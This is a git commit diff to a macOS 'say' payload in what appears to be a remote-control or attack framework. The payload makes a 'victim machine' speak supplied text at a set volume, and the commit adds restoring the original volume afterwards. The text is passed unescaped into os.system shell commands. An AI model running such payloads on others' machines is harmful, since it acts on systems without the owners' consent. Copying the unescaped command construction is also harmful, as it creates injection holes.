fe3ca102523cd57a5378617b231be8203ec30d96
Renmusxd <sumnernh@gmail.com>
2017-01-06 16:42:26 -0800

    Restore volume in say payload

--- server/payloads/osx/say_osx.py
+++ server/payloads/osx/say_osx.py
@@ -5,9 +5,21 @@ VAR TEXT: The text to be said by the victim machine
 VAR VOLUME = 100: The volume of the victim machine, defaults to 100/100
 '''
 import os
+import subprocess
 
+check_volume = 'set ovol to output volume of (get volume settings)\nreturn ovol'
 set_volume = "osascript -e 'set volume output volume {}'"
-os.system(set_volume.format(VOLUME))
 
+proc = subprocess.Popen(['osascript', '-'],
+                        stdin=subprocess.PIPE,
+                        stdout=subprocess.PIPE,
+                        stderr=subprocess.PIPE)
+
+out, err = proc.communicate(check_volume.encode('UTF-8'))
+vol = out.decode('UTF-8')
+
+os.system(set_volume.format(VOLUME))
 os.system('say "{}"'.format(TEXT))
+os.system(set_volume.format(vol))
+
 print("Successfully said: {}".format(TEXT))
